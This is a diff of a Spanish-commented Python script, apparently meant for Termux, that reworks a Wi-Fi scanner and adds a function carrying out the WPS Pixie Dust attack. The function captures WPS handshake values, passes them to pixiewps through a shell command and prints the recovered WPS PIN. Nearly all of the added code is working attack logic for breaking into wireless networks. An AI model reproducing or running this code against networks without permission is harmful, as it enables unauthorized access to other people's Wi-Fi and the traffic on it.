@@ -28,40 +28,71 @@ def freq_to_channel(freq):
     return freq
 
 def scan_wifi(interface):
-    """Escanea redes WiFi cercanas y devuelve información detallada."""
-    print("\n[+] Escaneando redes disponibles...")
-    output, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
-    networks = []
-    current_network = {}
-    
-    for line in output.splitlines():
-        if "BSS" in line:
-            if current_network:
-                networks.append(current_network)
-            current_network = {"BSSID": line.split()[1]}
-        elif "SSID:" in line:
-            current_network["SSID"] = line.split(":", 1)[1].strip()
-        elif "freq:" in line:
-            current_network["Channel"] = freq_to_channel(line.split(":")[1].strip())
-        elif "signal:" in line:
-            current_network["Signal"] = line.split(":")[1].strip()
-    if current_network:
-        networks.append(current_network)
-    
-    return networks
+    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada."""
+    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
+    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
+    redes = []
+    bssids = []
+    canales = []
+    intensidades = []
+    for linea in resultado.split('\n'):
+        if "SSID" in linea:
+            essid = linea.split(':', 1)[1].strip()
+            redes.append(essid)
+        if "BSS" in linea:
+            bssid = linea.split()[1].split('(')[0]
+            if is_valid_bssid(bssid):
+                bssids.append(bssid)
+        if "freq:" in linea:
+            freq = linea.split(':', 1)[1].strip()
+            canal = freq_to_channel(freq)
+            canales.append(canal)
+        if "signal:" in linea:
+            intensidad = linea.split(':', 1)[1].strip()
+            intensidades.append(intensidad)
+    return redes, bssids, canales, intensidades
 
-def create_wpa_supplicant_conf(ssid):
-    """Crea un archivo de configuración para wpa_supplicant."""
-    conf_content = f"""
-network={{
-    ssid="{ssid}"
-    key_mgmt=NONE
-}}
-"""
-    conf_path = "/data/data/com.termux/files/home/wpa_supplicant.conf"
-    with open(conf_path, "w") as conf_file:
-        conf_file.write(conf_content)
-    return conf_path
+def perform_pixie_dust_attack(interface, ssid):
+    """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
+    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")
+
+    # Capturar los datos necesarios usando wpa_supplicant
+    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
+    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
+        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
+        return
+
+    # Mostrar las claves capturadas
+    print("\n--- Claves capturadas ---")
+    print(f"PKE: {pke}")
+    print(f"PKR: {pkr}")
+    print(f"E-Hash1: {ehash1}")
+    print(f"E-Hash2: {ehash2}")
+    print(f"AuthKey: {authkey}")
+    print(f"E-Nonce: {enonce}")
+    print("-------------------------")
+
+    # Ejecutar pixiewps con los valores capturados
+    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
+    print(f"Ejecutando pixiewps: {pixiewps_command}")
+    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    for line in process.stdout:
+        print(line.strip())  # Mostrar la salida de pixiewps en tiempo real
+    
+    pixie_stdout, pixie_stderr = process.communicate()
+
+    print("\n--- Salida de pixiewps ---")
+    print(pixie_stdout)
+    print(pixie_stderr)
+
+    if "WPS pin:" in pixie_stdout:
+        pin = extract_value(pixie_stdout, "WPS pin:")
+        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
+        return pin
+    else:
+        print("\nPixie Dust no pudo encontrar el PIN.")
+        return None
 
 def run_wpa_supplicant(interface, ssid):
     """Ejecuta wpa_supplicant para intentar asociarse con la red."""
